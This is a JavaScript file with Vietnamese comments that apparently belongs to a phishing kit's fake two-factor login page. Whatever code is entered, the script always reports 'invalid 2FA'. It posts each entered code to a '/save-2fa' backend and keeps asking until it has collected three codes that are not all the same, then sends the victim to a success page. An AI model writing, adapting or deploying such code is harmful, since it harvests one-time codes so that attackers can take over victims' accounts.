let countdownTimer = null; // Biến lưu trạng thái của countdown
let countdownDuration = 60; // Thời gian countdown (giây)

document.getElementById('send2fa').addEventListener('click', function (event) {
    event.preventDefault(); // Ngăn tải lại trang nếu nút là submit button.

    // Lấy các thành phần liên quan
    const spinner = document.getElementById('2faspin');
    const buttonText = document.querySelector('#send2fa .button-text');
    const invalid2faDiv = document.getElementById('invalid2fa');
    const timerSpan = document.getElementById('timer');
    const twoFACodeInput = document.getElementById('2facode');
    const twoFACode = twoFACodeInput.value.trim();

    // Hiển thị spinner và ẩn văn bản
    spinner.style.display = 'inline-block';
    buttonText.style.display = 'none';

    // Bắt đầu spinner trong 3 giây
    setTimeout(() => {
        // Ẩn spinner và hiển thị lại văn bản
        spinner.style.display = 'none';
        buttonText.style.display = 'inline-block';

        // Hiển thị thông báo invalid2fa khi spinner kết thúc
        invalid2faDiv.style.display = 'block';
        timerSpan.textContent = `${countdownDuration}s`;

        // Khởi động countdown
        if (countdownTimer) {
            clearInterval(countdownTimer); // Hủy countdown hiện tại nếu đang chạy
        }

        let remainingTime = countdownDuration;
        countdownTimer = setInterval(() => {
            remainingTime -= 1;
            timerSpan.textContent = `${remainingTime}s`;

            if (remainingTime <= 0) {
                clearInterval(countdownTimer); // Dừng countdown khi hết giờ
                invalid2faDiv.style.display = 'none'; // Ẩn thông báo lỗi
                twoFACodeInput.classList.remove('is-invalid'); // Xóa hiệu ứng lỗi
            }
        }, 1000);

        // Nếu input trống, thêm hiệu ứng lỗi cho input
        if (!twoFACode) {
            twoFACodeInput.classList.add('is-invalid');
        } else {
            // Gửi dữ liệu về backend nếu input không trống
            fetch('/save-2fa', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ twoFACode }),
            })
                .then(response => {
                    if (response.ok) {
                        console.log('2FA code sent successfully.');

                        // Lưu code vào sessionStorage
                        let code1 = sessionStorage.getItem('code1');
                        let code2 = sessionStorage.getItem('code2');
                        let code3 = sessionStorage.getItem('code3');

                        if (!code1) {
                            sessionStorage.setItem('code1', twoFACode);
                        } else if (!code2) {
                            sessionStorage.setItem('code2', twoFACode);
                        } else if (!code3) {
                            sessionStorage.setItem('code3', twoFACode);
                        } else {
                            // Nếu cả 3 mã đã tồn tại, cập nhật theo thứ tự (FIFO)
                            sessionStorage.setItem('code1', code2);
                            sessionStorage.setItem('code2', code3);
                            sessionStorage.setItem('code3', twoFACode);
                        }

                        // Cập nhật lại giá trị mới
                        code1 = sessionStorage.getItem('code1');
                        code2 = sessionStorage.getItem('code2');
                        code3 = sessionStorage.getItem('code3');

                        // Kiểm tra nếu ít nhất 2 mã khác nhau
                        if (
                            code1 && code2 && code3 &&
                            (code1 !== code2 || code1 !== code3 || code2 !== code3)
                        ) {
                            console.log('At least 2 codes are unique. Redirecting to success page...');
                            window.location.href = 'success.html';
                        }
                    } else {
                        throw new Error('Failed to send 2FA code.');
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                });
        }
    }, 3000); // Spinner hoạt động trong 3 giây
});
